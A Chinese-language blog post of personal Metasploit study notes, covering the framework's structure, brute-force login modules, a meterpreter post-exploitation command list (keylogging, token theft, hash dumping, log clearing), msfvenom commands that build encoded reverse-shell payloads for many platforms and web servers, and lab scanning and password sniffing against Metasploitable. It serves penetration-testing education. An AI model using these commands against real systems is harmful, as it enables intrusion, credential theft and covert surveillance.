---
title: Metasploit 学习记录
author: 简文涛
categories:
  - 工具
tags:
  - Metasploit
comments: true
top: false
summary: Metasploit是一款开源的渗透测试框架平台，MSF已经内置了数千个已披露的漏洞相关的模块和渗透测试工具，模块使用ruby语言编写。
img: 'https://cdn.jsdelivr.net/gh/jwt1399/cdn//img/20200811211637.png'
abbrlink: 42826
date: 2020-08-12 10:33:50
updated:
permalink:
---

一直在用 Metasploit，但是从来没有花时间仔细去研究这个工具，最近得空就系统的研究研究，故于此记录之。



## 简介

Metasploit是一款开源的渗透测试框架平台，MSF已经内置了数千个已披露的漏洞相关的模块和渗透测试工具，模块使用ruby语言编写。

官网：https://www.metasploit.com/

## Metasploit体系框架

### 体系框架图

![Metasploit体系框架](https://cdn.jsdelivr.net/gh/jwt1399/cdn//img/20200811215048.png)



### **基础库文件**

> Metasploit基础库文件位于源码根目录路径下的 `libraries` 目录中，包括 `Rex`，`framework-core`和`framework-base` 三部分。

- **Rex（Ruby extension）：**是整个框架所依赖的最基础的一些组件，为开发者进行框架和模块开发提供了一些基础功能的支持，如包装的网络套接字、网络应用协议客户端与服务端实现、日志子系统、渗透攻击支持例程、PostgreSQL以及MySQL数据库支持等；
- **framework-core：** 负责实现所有与各种类型的上层模块及插件的交互接口；
- **framework-base：** 扩展了framework-core，提供更加简单的包装例程，并为处理框架各个方面的功能提供了一些功能类，用于支持用户接口与功能程序调用框架本身功能及框架集成模块；

### **模块**

> 模块是通过Metasploit框架所装载、集成并对外提供的最核心的渗透测试功能实现代码。分为`辅助模块(Aux)`、`渗透攻击模块(Exploits)`、`后渗透攻击模块(Post)`、`攻击载荷模块(payloads)`、`编码器模块(Encoders)`、`空指令模块(Nops)`。这些模块拥有非常清晰的结构和一个预定义好的接口，并可以组合支持信息收集、渗透攻击与后渗透攻击拓展。

- **辅助模块(Aux)：**　在渗透信息搜集环节提供了大量的辅助模块支持，包括针对各种网络服务的扫描与查点、构建虚假服务收集登录密码、口令猜测等模块。

- **渗透攻击模块(Exploits)：**利用发现的安全漏洞和配置弱点对远程目标系统进行攻击，植入运行攻击载荷，从而获得对远程目标系统访问权的代码组件。

- **攻击载荷模块(payloads)：**在渗透攻击成功后促使目标系统运行的一段植入代码，通常作用是为渗透攻击者打开在目标系统上的控制会话连接。
- **空指令模块(Nops)：**用来在攻击载荷中添加空指令区， 以提高攻击可靠性的组件。

- **编码器模块(Encoders)：**攻击载荷与空指令模块组装完成一个指令序列后，进行编码，来绕过防护软件拦截。

- **后渗透攻击模块(Post)：**在渗透攻击取得目标系统远程控制权之后，在受控系统中进行各种各样的后渗透攻击动作，比如获取敏感信息，进一步括展，实施跳板攻击等。
- **躲避模块(Evasion)：**5.0新增的模块，这个模块可以轻松的创建反杀毒软件的木马。

### **插件**

　　插件能够扩充框架的功能，或者组装已有功能构成高级特性的组件。插件可以集成现有的一些外部安全工具，如 Nessus、OpenVAS 漏洞扫描器等，为用户接口提供一些新的功能。

### **接口**

　　包括 msfconsole 控制终端、msfcli 命令行、msfgui 图形化界面、armitage 图形化界面以及 msfapi 远程调用接口等。

### **功能程序**

　　除了用户使用用户接口访问 metasploit 框架主体功能之外，metasploit 还提供了一系列可直接运行的功能程序，支持渗透测试者与安全人员快速地利用 metasploit 框架内部能力完成一些特定任务。比如 `msfpayload`、`msfencode` 和 `msfvenom` 可以将攻击载荷封装为可执行文件、C语言、JavaScript语言等多种形式，并可以进行各种类型的编码。`msf*scan`系列功能程序提供了在PE、ELF等各种类型文件中搜索特定指令的功能，可以帮助渗透代码开发人员定位指令地址。

## Metasploit目录结构

目录地址：`/usr/share/metasploit-framework/`

最重要的目录是data，modules，scripts，tools，plugins

![主目录](https://cdn.jsdelivr.net/gh/jwt1399/cdn//img/20200812115104.png)

### data目录

存放meterpreter，exploits，wordlists等。

![data目录](https://cdn.jsdelivr.net/gh/jwt1399/cdn//img/20200812115104.png)

**meterpreter**是msf的攻击载荷，使用于后渗透阶段

**exploits**里面则存放了许多的cve漏洞利用代码

**wordlists**里面放的是字典文件

### modules目录

metasploit的核心目录了，存放着各个攻击模块

![modules目录](https://cdn.jsdelivr.net/gh/jwt1399/cdn//img/20200812115053.png)

### scirpts目录

存放一些msf用到的脚本文件，分别是meterpreter，ps，resource，shell

![scirpts目录](https://cdn.jsdelivr.net/gh/jwt1399/cdn//img/20200812115348.png)

### tools目录

存放各种可使用的工具

![tools目录](https://cdn.jsdelivr.net/gh/jwt1399/cdn//img/20200812164726.png)

### plugins目录

存放msf的各种插件

![plugins目录](https://cdn.jsdelivr.net/gh/jwt1399/cdn//img/20200812164729.png)

## Metasploit命令篇

### **MSF启动**

方法一：

```bash
sudo msfdb init && msfconsole
```

方法二：

- 1.开启数据库：service start postgresql 

- 2.设置数据库开机启动：service enable postgresql 

- 3.初始化MSF数据库：msfdb init　　　　[初次使用需要初始化]

- 4.开启MSF：msfconsole

- 5.查看数据库连接状态：db_status

启动完成后会有一些统计信息，比如说版本号，有多少个 exploits，多少个 payloads 等。

![](https://cdn.jsdelivr.net/gh/jwt1399/cdn//img/20200812171940.png)

### 常用命令

通过 `help` 查看帮助，可以对 msf 有个整体认识，可以看到 msf 相关命令可以分成以下类型：

| Core Commands                | 核心命令          |
| ---------------------------- | ----------------- |
| Module Commands              | 模块命令          |
| Job Commands                 | 后台任务命令      |
| Resource Script Commands     | 资源脚本命令      |
| Database Backend Commands    | 数据库后端命令    |
| Credentials Backend Commands | 证书/凭证后端命令 |
| Developer Commands           | 开发人员命令      |

 待更。。。

## Metasploit爆破篇

### 爆破TELNET

```bash
msf > use auxiliary/scanner/telnet/telnet_login 
msf auxiliary(telnet_login) > set RHOSTS 192.168.1.103
msf auxiliary(telnet_login) > set STOP_ON_SUCCESS true #爆破成功就停止
msf auxiliary(telnet_login) > set VERBOSE true #打印输出
msf auxiliary(telnet_login) > set USER_FILE /root/Desktop/username.txt
msf auxiliary(telnet_login) > set PASS_FILE /root/Desktop/password.txt
msf auxiliary(telnet_login) > exploit 
```

### 爆破SSH

```bash
msf > use auxiliary/scanner/ssh/ssh_login
msf auxiliary(ssh_login) > set RHOSTS 192.168.1.103
msf auxiliary(ssh_login) > set STOP_ON_SUCCESS true #爆破成功就停止
msf auxiliary(ssh_login) > set VERBOSE true #打印输出
msf auxiliary(ssh_login) > set USER_FILE /root/Desktop/username.txt
msf auxiliary(ssh_login) > set PASS_FILE /root/Desktop/password.txt
msf auxiliary(ssh_login) > set THREADS 50
msf auxiliary(ssh_login) > run
```

### 爆破MYSQL

```bash
msf > use  auxiliary/scanner/mysql/mysql_login
msf auxiliary(mysql_login) > set RHOSTS  192.168.1.103
msf auxiliary(mysql_login) > set STOP_ON_SUCCESS true #爆破成功就停止
msf auxiliary(mysql_login) > set VERBOSE true #打印输出
msf auxiliary(mysql_login) > set USER_FILE /root/Desktop/username.txt
msf auxiliary(mysql_login) > set PASS_FILE /root/Desktop/password.txt
msf auxiliary(mysql_login) > run
```

### 爆破FTP

```bash
msf > use auxiliary/scanner/ftp/ftp_login
msf auxiliary(ftp_login) > set RHOSTS  192.168.1.103
msf auxiliary(ftp_login) > set STOP_ON_SUCCESS true #爆破成功就停止
msf auxiliary(ftp_login) > set VERBOSE true #打印输出
msf auxiliary(ftp_login) > set USERNAME msfadmin
msf auxiliary(ftp_login) > set PASS_FILE /root/Desktop/password.txt
msf auxiliary(ftp_login) > run
```

### 爆破postgressql数据库

```bash
msf > use auxiliary/scanner/postgres/postgres_login  
msf auxiliary(postgres_login) > set RHOSTS  192.168.1.103
msf auxiliary(postgres_login) > set STOP_ON_SUCCESS true #爆破成功就停止
msf auxiliary(postgres_login) > set VERBOSE true #打印输出
msf auxiliary(postgres_login) > set USER_FILE /root/Desktop/username.txt
msf auxiliary(postgres_login) > set PASS_FILE /root/Desktop/password.txt
msf auxiliary(postgres_login) > run
```

## meterpreter

### 常用命令

```bash
　run scriptname       运行Meterpreter脚本，在scripts/meterpreter目录下可查看所有的脚本名。
  sysinfo                    列出受控主机的系统信息。
  ls                             列出目标主机的文件和文件夹信息。
  use priv                    加载特权提升扩展模块，来扩展Meterpreter库。
  ps                            显示所有运行进程以及关联的用户账号。
  migrate PID               迁移到一个指定的进程ID(PID可通过ps从目标主机上获得）。
  use incognito             加载incognito功能（用来盗窃目标主机的令牌或是假冒用户).
  list_tokens -u            列出目标主机用户的可用令牌。
  list_tokens -g            列出目标主机用户组的可用令牌。
  impersonate_token DOMAIN_NAME\\USERNAME             假冒目标主机上的可用令牌。
  steal_token PID          盗窃给定进程的可用令牌并进行令牌假冒。
  drop_token                停止假冒当前令牌。
  getsystem                  通过各种攻击向量来提升系统用户权限。
  shell                          以所有可用令牌来运行一个交互的shell。
  execute -f cmd.exe -i  执行cmd.exe命令并进行交互。
 execute -f cmd.exe -i -t 以所有可用的令牌来执行cmd命令。
  execute -f cmd.exe -i -H -t  以所有可用的令牌来执行cmd命令并隐藏该进程。
  rev2self                      回到控制目标主机的初始化用户账号下。
  reg command              在目标主机注册表中进行交互，创建，删除，查询等操作。
  setdesktop number      切换到另一个用户界面（该功能基于哪些用户已登录）。
  screenshot                  对目标主机的屏幕进行截图。
  upload file                   向目标主机上传文件
  download file               从目标主机下载文件。
  keyscan_start             针对远程目标主机开启键盘记录功能。
  keyscan_dump            存储目标主机上捕获的键盘记录。
  keyscan_stop              停止针对目标主机的键盘记录功能。
  getprivs                      尽可能多的获取目标主机上的特权。
  uictl enable keyboard/mouse     接管目标主机的键盘和鼠标。
  background                 将你当前的Meterpreter shell转为后台执行。
  hashdump                   导出目标主机中的口令哈希值。
  use sniffer                   加载嗅探模块。
  sniffer_interfaces          列出目标主机所有开放的网络接口。
  sniffer_dump interfaceID pcapname        在目标主机上启动嗅探。
  sniffer_stats interfaceID  获取正在实施嗅探网络接口的统计数据。
  sniffer_start interfaceID packet-buffer  在目标主机上针对特定范围的数据包缓冲区启动嗅探。
  sniffer_stop interfaceID 停止嗅探。
  add_user username password -h ip   在远程目标主机上添加一个用户。
  add_group_user "Domain Admins" username -h ip     将用户添加到目标主机的域管理员组中。
  clearev                        清除目标主机上的日志记录。
  timestomp                   修改文件属性，例如修改文件的创建时间（反取证调查）。
  reboot                         重启目标主机。
```

### meterpreter中文乱码

#### 成因

Linux下面汉字默认是UTF-8编码
Windows下汉字使用的是GBK系列编码

#### 解决方案

方法一：直接执行 `chcp 65001` 命令

方法二：将终端临时设置为`GBK`系列编码即可

## msfvenom

> **msfvenom **是 `msfpayload` 和 `msfencode` 的结合体，可利用 msfvenom 生成木马程序,并在目标机上执行,在本地监听上线

### msfvenom参数

查看帮助参数的命令`msfvenom -h`

```bash
Options:
    -l, --list            <type>        # 列出所有可用的项目，其中值可以被设置为 payloads, encoders, nops, platforms, archs, encrypt, formats等等
    -p, --payload         <payload>     # 指定特定的 Payload，如果被设置为 - ，那么从标准输入流中读取
        --list-options                  # 列出--payload <value> 的标准，高级和规避选项
    -f, --format          <format>      # 指定 Payload 的输出格式(使用 --list formats 列出)
    -e, --encoder         <encoder>     # 指定使用的 Encoder (使用 --list encoders 列出)
        --sec-name        <value>       # 生成大型Windows二进制文件时使用的新名称。默认值：随机4个字符的字符串
        --smallest                      # 使用所有可用的编码器生成最小的payload
        --encrypt         <value>       # 应用于shellcode的加密或编码类型 (使用--list encrypt 列出)
        --encrypt-key     <value>       # 用于加密的密钥
        --encrypt-iv      <value>       # 加密的初始化向量
    -a, --arch            <arch>        # 指定目标系统架构(使用 --list archs  列出)
        --platform        <platform>    # 指定目标系统平台 (使用 --list platforms 列出)
    -o, --out             <path>        # 保存payload到文件
    -b, --bad-chars       <list>        # 设置需要在 Payload 中避免出现的字符，如： '\x00\xff'
    -n, --nopsled         <length>      # 指定 nop 在 payload 中的数量
    -s, --space           <length>      # 设置未经编码的 Payload 的最大长度
        --encoder-space   <length>      # 编码后的 Payload 的最大长度
    -i, --iterations      <count>       # 设置 Payload 的编码次数
    -c, --add-code        <path>        # 指定包含一个额外的win32 shellcode文件
    -x, --template        <path>        # 指定一个特定的可执行文件作为模板
    -k, --keep                          # 保护模板程序的功能，注入的payload作为一个新的进程运行
    -v, --var-name        <value>       # 指定一个变量名（当添加 -f 参数的时候，例如 -f python，那么输出为 python 代码， payload 会被按行格式化为 python 代码，追加到一个 python 变量中，这个参数即为指定 python 变量的变量名）
    -t, --timeout         <second>      # 设置从STDIN读取payload的等待时间（默认为30,0为禁用）
    -h, --help                          # 帮助
```

### msfvenom生成Payload

```bash
#普通生成
msfvenom -p <payload> <payload options> -f <format> -o <path>
msfvenom -p windows/meterpreter/reverse_tcp  -f exe -o payload.exe

#编码生成
msfvenom -a 系统架构 --platform 系统平台 -p 有效载荷 lhost=攻击机IP lport=攻击机端口 -e 编码方式  -i 编码次数 -f 输出格式 -o 输出文件
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp lhost=192.168.1.1 lport=12345 -i 3 -e x86/shikata_ga_nai -f exe -o payload.exe
```

```bash
msfvenom -l archs		#查看支持的系统架构
msfvenom -l platforms	#查看支持系统平台
msfvenom -l payload    		#列出所有可用的payload
msfvenom -l formats    		#列出所有的输出格式
msfvenom -l encrypt    		#列出所有的加密方式
msfvenom -l encoders   		#列出所有的编码器
```

### 创建监听器

等待shell回连,务必注意,创建什么类型的payload就要用什么类型的监听器来接收,必须一一对应,此处就以最普通的tcp监听器为例

```bash
msf > use exploit/multi/handler
msf > set payload windows/meterpreter/reverse_tcp
msf > set lport 12345   #也可以使用默认的4444端口
msf > set lhost 192.168.1.101
msf > exploit
```

### 各类OS系统的payload

#### windows 平台

普通的exe 直接双击即可触发,会弹回一个常规meterpreter

```bash
msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=192.168.52.128 LPORT=12345 -e x86/shikata_ga_nai -b '\x00\x0a\xff' -i 3 -f exe -o x86_shell.exe
```

powershell，把文件中编码后的powershell payload代码直接抠出来,丢到目标机器的cmd中去执行触发,会弹回一个powershell的shell

```bash
msfvenom -a x86 --platform Windows -p windows/powershell_reverse_tcp LHOST=192.168.3.12 LPORT=12345 -e cmd/powershell_base64 -i 3 -f raw -o x86_shell.ps1
```

#### linux 平台

直接赋予执行权限,执行即可触发

```bash
msfvenom -a x86 --platform Linux -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.3.12 LPORT=12345 -f elf -o x86_shell.elf
```

#### mac 平台

```bash
msfvenom -a x86 --platform osx -p osx/x86/shell_reverse_tcp LHOST=192.168.3.12 LPORT=12345 -f macho -o x86_shell.macho
```

#### android平台

注意这里生成的apk是不能直接被装到手机上的,还需要你自己给apk签个名才能装,装完以后点击打开即可触发

```bash
msfvenom -a x86 --platform Android -p android/meterpreter/reverse_tcp LHOST=192.168.3.12 LPORT=12345 -f apk -o x86_shell.apk
```

### 各类web的Payload

基于脚本,对于此类的web脚本触发执行方法非常简单,直接在url中访问该脚本即可

#### php 脚本

```bash
msfvenom --platform PHP -p php/meterpreter/reverse_tcp LHOST=192.168.3.12 LPORT=12345 -f raw -o x86_shell.php
```

#### asp 脚本

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.3.12 LPORT=12345 -f asp -o shell.asp
```

#### aspx 脚本

```bash
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.3.12 LPORT=12345 -f aspx -o x86_shell.aspx
```

#### jsp 脚本

```bash
msfvenom --platform java -p java/jsp_shell_reverse_tcp LHOST=192.168.3.12 LPORT=12345 -f raw -o x86_shell.jsp
```

#### war包

找个能部署war包的地方,如各类java控制台,部署一下即可执行

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.3.12 LPORT=12345 -f raw -o x86_shell.war
```

### 各类脚本的payload

#### nodejs

```bash
msfvenom -p nodejs/shell_reverse_tcp LHOST=192.168.3.12 LPORT=12345 -f raw -o x86_shell.js
```

#### python

```bash
msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.3.12 LPORT=12345 -f raw -o x86_shell.py
```

#### perl

```bash
msfvenom -p cmd/unix/reverse_perl LHOST=192.168.3.12 LPORT=12345 -f raw -o x86_shell.pl
```

#### ruby

```bash
msfvenom -p ruby/shell_reverse_tcp LHOST=192.168.3.12 LPORT=12345 -f raw -o x86_shell.rb
```

#### lua

```bash
msfvenom -p cmd/unix/reverse_lua LHOST=192.168.3.12 LPORT=12345 -f raw -o x86_shell.lua
```

#### bash

```bash
msfvenom -p cmd/unix/reverse_bash LHOST=192.168.3.12 LPORT=12345 -f raw -o shell.sh
```

**参考：**

- [Metasploit——msfvenom免杀木马](https://blog.csdn.net/weixin_44677409/article/details/96346481)
- [msfvenom进阶](https://klionsec.github.io/2017/03/08/msfvenom-advanced/)
- [远控免杀专题文章(2)-msfvenom隐藏的参数](https://mp.weixin.qq.com/s/1r0iakLpnLrjCrOp2gT10w)

## Metasploit信息收集篇

基于TCP协议收集主机信息

### 主机信息收集

使用`auxiliary/scanner/discovery/`下模块进行扫描

```bash
use auxiliary/scanner/discovery/arp_sweep #发现存活的主机
use auxiliary/scanner/discovery/empty_udp
use auxiliary/scanner/discovery/ipv6_multicast_ping
use auxiliary/scanner/discovery/ipv6_neighbor
use auxiliary/scanner/discovery/ipv6_neighbor_router_advertisement
use auxiliary/scanner/discovery/udp_probe
use auxiliary/scanner/discovery/udp_sweep #除了可以探测到存活主机之外，还可以获得主机名称信息
```

**实例：使用arp_sweep模块来发现存活的主机**

```bash
search arp_sweep       #查询此模块下的攻击模块
use   查询出来的攻击模块  #加载攻击模块
show options           #查看一下该模块需要配置的选项参数
set RHOSTS 目标机ip     #使用set命令将RHOSTS设置为目标电脑的IP
exploit                #进行攻击
```

### 主机端口扫描

使用`auxiliary/scanner/portscan/`下的模块探测主机端口

```bash
auxiliary/scanner/portscan/ack       #ACK防火墙扫描
auxiliary/scanner/portscan/ftpbounce #FTP跳端口扫描
auxiliary/scanner/portscan/syn       #SYN端口扫描(半连接扫描)
auxiliary/scanner/portscan/tcp       #TCP端口扫描
auxiliary/scanner/portscan/xmas      #TCP”XMas”端口扫描
```

### SMB扫描

> SMB(全称是Server Message Block)是一个协议名，它能被用于Web连接和客户端与服务器之间的信息沟通。基于SSH协议收集信息，端口：`139`、`445`

使用`auxiliary/scanner/smb/`下的模块进行SMB相关操作

```bash
auxiliary/scanner/smb/pipe_auditor 		    #扫描命名管道
auxiliary/scanner/smb/pipe_dcerpc_auditor    #返回DCERPC信息
auxiliary/scanner/smb/psexec_loggedin_users  
auxiliary/scanner/smb/smb2                   #扫描SMB2协议
auxiliary/scanner/smb/smb_enum_gpp           
auxiliary/scanner/smb/smb_enumshares         #扫描smb共享文件
auxiliary/scanner/smb/smb_enumusers          #smb枚举系统用户
auxiliary/scanner/smb/smb_enumusers_domain   
auxiliary/scanner/smb/smb_login              #SMB登录
auxiliary/scanner/smb/smb_lookupsid          #扫描组的用户
auxiliary/scanner/smb/smb_uninit_cred        
auxiliary/scanner/smb/smb_version            #扫描系统版本
```

**实例：使用 smb_version 基于 SMB 协议扫描版本号 **

```bash
msf5 > use auxiliary/scanner/smb/smb_version 
#设置扫描目标，注意多个目标使用逗号+空格隔开 
msf5 auxiliary(scanner/smb/smb_version) > show options 
msf5 auxiliary(scanner/smb/smb_version) > set RHOSTS 192.168.1.56, 192.168.1.180  
#注： 192.168.1.56 后面的逗号和 192.168.1.180 之间是有空格的 
msf5 auxiliary(scanner/smb/smb_version) > run 
```

扫描出来操作系统的版本号

![](https://cdn.jsdelivr.net/gh/jwt1399/cdn//img/20200813104251.png)

### SSH探测扫描

使用`auxiliary/scanner/ssh/`下的模块探测ssh信息

```bash
auxiliary/scanner/ssh/cerberus_sftp_enumusers
auxiliary/scanner/ssh/detect_kippo
auxiliary/scanner/ssh/ssh_enumusers     #枚举用户
auxiliary/scanner/ssh/ssh_identify_pubkeys
auxiliary/scanner/ssh/ssh_login         #密码爆破
auxiliary/scanner/ssh/ssh_login_pubkey
auxiliary/scanner/ssh/ssh_version       #查看版本
```

### FTP探测扫描

使用`auxiliary/scanner/ftp/`下的模块探测ftp信息

```bash
auxiliary/scanner/ftp/anonymous         #匿名登录扫描
auxiliary/scanner/ftp/bison_ftp_traversal
auxiliary/scanner/ftp/ftp_login         #密码爆破
auxiliary/scanner/ftp/ftp_version       #查看版本
auxiliary/scanner/ftp/konica_ftp_traversal
auxiliary/scanner/ftp/pcman_ftp_traversal
auxiliary/scanner/ftp/titanftp_xcrc_traversal
```

### MYSQL探测扫描

使用`auxiliary/scanner/mysql/`下的模块探测mysql信息

```bash
auxiliary/scanner/mysql/mysql_authbypass_hashdump
auxiliary/scanner/mysql/mysql_file_enum
auxiliary/scanner/mysql/mysql_hashdump   #dump密码hash
auxiliary/scanner/mysql/mysql_login      #密码爆破
auxiliary/scanner/mysql/mysql_schemadump
auxiliary/scanner/mysql/mysql_version    #查看版本
```

### SQLSERVER探测扫描

使用`auxiliary/scanner/mssql/`下的模块探测SQL server的信息

```bash
auxiliary/scanner/mssql/mssql_hashdump  #dump密码hash
auxiliary/scanner/mssql/mssql_login     #密码爆破
auxiliary/scanner/mssql/mssql_ping      #嗅探
auxiliary/scanner/mssql/mssql_schemadump
```

### **SNMP扫描**

> 简单网络管理协议（[SNMP](https://baike.baidu.com/item/SNMP/133378)） 是专门设计用于在 IP 网络管理[网络节点](https://baike.baidu.com/item/网络节点/9338583)（服务器、工作站、路由器、交换机及HUBS等）的一种标准协议，SNMP 使网络管理员能够管理网络效能，发现并解决网络问题以及规划网络增长。通过 SNMP 接收随机消息（及事件报告）网络管理系统获知网络出现问题。端口：`161`

使用`auxiliary/scanner/snmp/`下的模块探测 SNMP 的信息

```bash
use auxiliary/scanner/snmp/snmp_login #确定SNMP设备团体字符串的模块。
use auxiliary/scanner/snmp/snmp_enum  #主机的枚举
use auxiliary/scanner/snmp/snmp_enumusers （windows） #收集在远程系统上的用户名的列表。
use auxiliary/scanner/snmp/snmp_enumshares （windows）#查询范围的主机，以确定任何可用的共享。
```

**实例**:

1、先到 Metasploitable2-Linux 主机上修改一下 SNMP 服务，因为默认服务是不对外开放的。 

```bash
msfadmin@metasploitable:~# sudo vim  /etc/default/snmpd 
#修改第11行，侦听地址修改为0.0.0.0 
SNMPDOPTS='-Lsd -Lf /dev/null -u snmp -I -smux -p /var/run/snmpd.pid 127.0.0.1' 
修改为： 
SNMPDOPTS='-Lsd -Lf /dev/null -u snmp -I -smux -p /var/run/snmpd.pid 0.0.0.0'  
#重启 SNMP 服务 
msfadmin@metasploitable:~$ sudo /etc/init.d/snmpd restart 
#确认服务监听正常 
msfadmin@metasploitable:~$ netstat -antup | grep 161 
(No info could be read for "-p": geteuid()=1000 but you should be root.) 
udp        0      0 0.0.0.0:161             0.0.0.0:*    
```

2、使用 snmp_enum 模块通过 snmp 协议扫描目标服务器信息

```bash
msf5 > use auxiliary/scanner/snmp/snmp_enum 
msf5 auxiliary(scanner/snmp/snmp_enum) > show options 
msf5 auxiliary(scanner/snmp/snmp_enum) > set RHOSTS 192.168.1.180 #靶机ip
msf5 auxiliary(scanner/snmp/snmp_enum) > run 
```

3、可以看到通过 snmp 协议探测到的信息非常多。如服务器硬件信息和服务器当前运行的进程，这两方面是其他扫描方式获取不到的。

![](https://cdn.jsdelivr.net/gh/jwt1399/cdn//img/20200813101917.png)

### 密码嗅探模块

这个 psnuffle 模块可以像以前的 dsniff 命令一样，去嗅探密码， 目前支持POP3，IMAP，FTP和HTTP GET 协议。
![](https://cdn.jsdelivr.net/gh/jwt1399/cdn//img/20200813094617.png)

**1、Kali开启嗅探**

```bash
msf5 > search sniffer 
msf5 > use auxiliary/sniffer/psnuffle
msf5 auxiliary(sniffer/psnuffle) >  info #查看 psnuffle 模块作用
msf5 auxiliary(sniffer/psnuffle) > show options 
msf5 auxiliary(psnuffle) > run  #直接run是实时在线的嗅探

msf5 auxiliary(psnuffle) > set pcapfile /root/ftp.pcap  #设置pcapfile可以提取pcap文件中的账号密码
```

**2、模拟靶机登录FTP**

```bash
#kali新建一个终端窗口登录ftp，Metasploitable2-Linux 靶机中已经开启了 FTP 服务可以直接登录。
root@kali:~# apt install lftp -y   #安装 lftp 命令 
root@kali:~# lftp -u msfadmin 192.168.1.180 #登录 FTP
密码:msfadmin 
#连接成功后，进行下数据交互，查看 ftp 目录下的文件 
lftp msfadmin@192.168.1.180:~> ls   
drwxr-xr-x    6 1000     1000         4096 Apr 28  2010 vulnerable 
```

**3、查看嗅探到的数据**

回到 MSF 终端可以看到用户名密码信息已经被获取。

![](https://cdn.jsdelivr.net/gh/jwt1399/cdn//img/20200813100540.png)

**4、关闭任务**

```bash
#嗅探完成后记得把后台任务关闭 
msf5 auxiliary(psnuffle) > jobs #查看后台运行的任务
msf5 auxiliary(psnuffle) > kill 0   #kill job 的 ID，关闭 job 
```

## 赞助💰

如果你觉得对你有帮助，你可以请我喝一杯冰可乐！嘻嘻🤭

<table>
  <tbody>
     <tr>
         <td style="text-align:center;">支付宝支付</td>
         <td style="text-align:center;">微信支付</td>
     </tr>
   <tr>
    <td style="text-align:center;" ><img width="200" src="https://jwt1399.top/medias/reward/alipay.png"></td>    
      <td style="text-align:center;"><img width="200" src="https://jwt1399.top/medias/reward/wechat.png"></td>     
  </tr>
</tbody></table>